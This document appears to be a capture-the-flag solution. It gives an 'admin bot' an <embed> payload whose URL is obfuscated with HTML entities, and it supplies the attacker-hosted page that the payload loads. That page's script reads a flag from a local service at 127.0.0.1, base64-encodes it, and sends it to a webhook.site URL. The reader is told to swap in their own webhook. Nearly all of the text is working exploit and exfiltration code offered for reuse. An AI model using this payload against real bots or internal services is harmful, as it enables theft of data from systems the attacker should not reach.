Send to admin bot this:
```
<embed code="http&#x73;:&#x2f;&#x2f;&#x77;&#x65;&#x62;&#x68;&#x6f;&#x6f;&#x6b;&#x2e;&#x73;&#x69;&#x74;&#x65;&#x2f;&#x34;&#x62;&#x37;&#x32;&#x61;&#x33;&#x62;&#x65;&#x2d;&#x36;&#x34;&#x32;&#x35;&#x2d;&#x34;&#x37;&#x31;&#x65;&#x2d;&#x39;&#x64;&#x32;&#x38;&#x2d;&#x39;&#x62;&#x38;&#x30;&#x37;&#x63;&#x33;&#x31;&#x39;&#x64;&#x32;&#x31;" type="text/ht ml"></embed>
```
And this is the host
```html
<script>
  function logError(err) {
    // send error message to your webhook
    fetch(
      'https://webhook.site/afb76521-0433-4466-b611-1341053715f5/?error=' +
      encodeURIComponent(err && err.toString())
    );
  }

  fetch('http://127.0.0.1:20070/flag')
    .then(r => r.text())
    .then(flag => {
      return fetch(
        'https://webhook.site/afb76521-0433-4466-b611-1341053715f5/?q=' +
        btoa(flag)
      );
    })
    .catch(logError);
</script>
```
(replace the webhook to your own)
